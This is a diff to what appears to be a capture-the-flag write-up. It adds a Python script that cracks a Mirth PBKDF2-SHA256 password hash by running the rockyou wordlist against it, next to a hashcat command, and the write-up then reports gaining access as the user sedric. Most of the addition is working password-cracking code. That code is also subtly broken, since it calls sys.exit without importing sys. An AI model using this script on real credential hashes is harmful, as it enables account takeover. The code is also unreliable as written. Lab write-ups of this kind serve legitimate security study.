@@ -168,6 +168,63 @@ Converting the hash in HEX, the bytes were: 40 bytes, since SHA-256 produce 32 b
 hashcat -m 10900 -a 0 "sha256:600000:bbff8b0413949da7:5b8b15d082216c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb0b32ddf0fb" /usr/share/wordlists/rockyou.txt  -w 3
 ```
 
+or you can either use this script:
+```python
+import time
+import base64 
+import hashlib
+
+# Extracted hash data
+hash_b64 = "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="
+decoded_bytes = base64.b64decode(hash_b64)
+
+# Mirth structure: First 8 byte = Salt, rest 32 byte = digest
+salt = decoded_bytes[:8]
+target_hash = decoded_bytes[8:]
+iterations = 600000
+wordlist_path = "/usr/share/wordlists/rockyou.txt"
+
+print(f"[*] Loading wordlist: {wordlist_path}")
+print(f"[*] Salt extracted: {salt.hex()}")
+print(f"[*] Iteration: {iterations} (Molto lento!)")
+print("-" * 50)
+
+start_time = time.time()
+count = 0
+
+try:
+    with open(wordlist_path, 'r', encoding='latin-1') as f:
+        for line in f:
+            password = line.strip()
+            if not password:
+                continue
+            
+            generated_key = hashlib.pbkdf2_hmac(
+                'sha256', 
+                password.encode('utf-8'), 
+                salt, 
+                iterations, 
+                dklen=32
+            )
+            
+            count += 1
+            if count % 10 == 0:
+                elapsed = time.time() - start_time
+                print(f"\r[>] Testate: {count} | Password attuale: {password[:15]}... | Speed: {count/elapsed:.2f} p/s", end="")
+
+            if generated_key == target_hash:
+                print(f"\n\Found! Password: {password}")
+                print(f"Time: {time.time() - start_time:.2f} seconds.")
+                sys.exit(0)
+
+except FileNotFoundError:
+    print(f"\nErrore: Wordlist not found in {wordlist_path}")
+except KeyboardInterrupt:
+    print("\n\n[!] interrupted.")
+
+print("\n\nPassword not found in the wordlist.")
+
+```
 After cracking the password, i finally got access as sedric!
 
 ### Privilege escalation
